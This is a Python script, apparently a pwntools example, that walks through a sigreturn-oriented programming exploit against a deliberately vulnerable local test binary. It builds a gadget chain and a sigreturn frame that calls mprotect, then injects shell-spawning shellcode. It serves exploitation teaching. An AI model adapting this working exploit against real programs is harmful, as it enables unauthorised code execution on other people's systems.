#!/usr/bin/python

"""
A set of examples that demonstrate how to mount an SROP attack
using pwntools/binjitsu.
Example tested on :
    Distributor ID:Ubuntu
    Description:Ubuntu 13.10
    Release:13.10
    Codename:saucy
    Linux z-VirtualBox 3.11.0-26-generic #45-Ubuntu SMP Tue Jul 15 04:04:15 UTC 2014 i686 i686 i686 GNU/Linux
"""

import os
import sys

from pwn import *

# Turn of all logging
context.log_level = 10000

"""
Example 1:
    Getting a shell from a binary that has an information leak.
    The binary is linked with libc.
    This example shows basic srop capabilities.
"""
def exploit():
    PAGE_SIZE     = 4096

    e = ELF('poc-32')

    p = process("poc-32")
    c = constants

    # We receive the "leaked" address of our input buffer
    p.recvuntil("Buffer = ")
    buffer_address = int(p.recvline()[:-1], 16)
    buffer_page    = buffer_address & ~(PAGE_SIZE - 1)

    # Addresses of the gadgets we use to mount the attack
    INT_80        = e.symbols["make_syscall"]
    POP_ESP_RET   = e.symbols["set_stackptr"]
    POP_EAX_RET   = e.symbols["set_eax"]

    sploit  = ""
    sploit += pack(POP_EAX_RET)
    sploit += pack(c.i386.SYS_sigreturn)
    sploit += pack(INT_80)

    s = SigreturnFrame()

    s.eax = constants.SYS_mprotect                      # syscall number
    s.ebx = buffer_page                                 # page containing buffer
    s.ecx = PAGE_SIZE                                   # page size
    s.edx = c.PROT_READ | c.PROT_WRITE | c.PROT_EXEC    # prot
    s.ebp = buffer_page                                 # valid value for ebp
    s.eip = INT_80                                      # syscall instruction

    # At the offset 92, we have an address that points to our
    # shellcode. The shellcode resides at offset 84.
    s.esp = buffer_address + 92

    sploit += s.get_frame()

    # The address of the shellcode
    sploit += pack(buffer_address+96)

    # Our shellcode
    sploit += asm(shellcraft.dupsh())

    # Register state :
    # EBP: 0xbffffb58 ("jaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaaf")
    # ESP: 0xbffffb50 ("haafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaaf")
    # EIP: 0x66616167 ('gaaf')
    # [-------------------------------------code-------------------------------------]
    # Invalid $PC address: 0x66616167
    eip_offset = cyclic_find("gaaf")

    # 524 bytes to get to the base pointer. Then we give the
    # base pointer a valid value i.e. `buffer_page`
    sploit += "\x90" * (eip_offset - 4 - len(sploit))
    sploit += pack(buffer_page)
    sploit += pack(POP_ESP_RET)
    sploit += pack(buffer_address)   # Buffer address

    p.send(sploit)
    p.interactive()

exploit()
